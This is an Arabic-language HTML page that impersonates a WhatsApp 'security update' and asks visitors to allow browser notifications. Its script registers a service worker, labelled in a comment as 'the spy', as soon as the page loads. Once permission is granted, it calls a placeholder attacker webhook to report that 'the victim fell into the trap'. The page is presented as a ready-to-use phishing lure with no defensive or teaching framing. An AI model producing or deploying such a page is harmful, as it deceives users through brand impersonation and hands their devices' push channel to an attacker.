<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحديث أمني لواتساب</title>
    <style>
        body { font-family: Arial; text-align: center; padding-top: 50px; background: #ece5dd; }
        .box { background: white; padding: 20px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        button { background: #25d366; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="50"><br>
        <h2>تحديث ميزة التشفير</h2>
        <p>يجب السماح بالإشعارات لتلقي رسائل واتساب المشفرة على هذا الجهاز.</p>
        <button onclick="subscribe()">تفعيل الآن</button>
    </div>

    <script>
        // تسجيل الجاسوس بمجرد دخول الضحية
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js');
        }

        function subscribe() {
            Notification.requestPermission().then(permission => {
                if (permission === 'granted') {
                    alert("تم التفعيل بنجاح! ستصلك الإشعارات الآن.");
                    // هنا نرسل إشارة لخادمك أن الضحية وقع في الفخ
                    fetch('https://your-webhook-url.com/victim_ready');
                }
            });
        }
    </script>
</body>
</html>
